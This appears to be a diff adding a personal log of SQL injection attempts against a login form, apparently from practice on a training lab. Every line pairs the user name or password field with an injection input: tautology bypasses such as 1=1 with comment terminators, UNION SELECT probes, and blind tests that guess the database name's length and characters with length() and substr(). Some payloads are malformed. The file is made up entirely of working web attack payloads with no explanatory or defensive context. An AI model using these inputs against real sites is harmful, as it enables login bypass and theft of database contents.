@@ -1,0 +1,38 @@
+User Name:
+Password:1" or 1=1 #
+User Name:
+Password:1' or 1=1 #
+User Name:1' or 1=1 #
+Password:1
+User Name:1' or 1=1 --+
+Password:
+User Name:1" or 1=1  #
+Password:
+User Name:1" or 1=1 --+
+Password:
+User Name:1") or 1=1 #
+Password:
+User Name:1") or union select 1,1 #
+Password:
+User Name:1") or union select 1,1 #
+Password:
+User Name:1") or union select 1,1 --+
+Password:
+User Name:1" or 1=1  #
+Password:
+User Name:1") or 1=1 #
+Password:
+User Name:1") or union select 1,1 #
+Password:
+User Name:1") or 1=1  #
+Password:
+User Name:
+Password:1") or 1=1 #
+User Name:
+Password:1") or union select 1,1 #
+User Name:
+Password:1") or length(database())=8 #
+User Name:
+Password:1") or substr(database(),1,1)="s" #
+User Name:
+Password:1") or substr(database(),1,1)="e" #
